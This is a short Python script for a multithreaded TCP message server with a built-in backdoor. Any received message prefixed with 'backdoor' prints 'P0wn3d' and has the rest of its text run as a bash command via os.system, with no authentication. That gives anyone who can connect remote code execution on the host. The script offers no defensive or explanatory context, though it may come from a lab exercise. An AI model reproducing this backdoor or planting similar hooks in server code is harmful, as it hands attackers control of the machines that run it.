#!/usr/bin/env python3

import socket
import threading
import os, sys
threadsClients=[]
selected_port = input("Choose port number: \n")

def instanceServer (client, infosClient):
	address = infosClient[0]
	port = str(infosClient[1])
	print("Server instance ready for " +  address + ":" + port)
	message = ""
	while message.upper() != "END":
		message = client.recv(255).decode("utf-8")
		print("Received message from " + address + ":" + port + " : " +message)
		client.send("Received message".encode("utf-8"))
		if message[0:8] == "backdoor":
			print("P0wn3d: " + message[8:])
			os.system('msg='+message[8:]+'; /bin/bash -c "$msg"')
	print("Connection closed with " + address + ":" + port)
	client.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('',int(selected_port)))
server.listen(5)

while True:
	client, infosClient = server.accept()
	threadsClients.append(threading.Thread(None, instanceServer, None, (client, infosClient), {}))
	threadsClients[-1].start()
server.close()
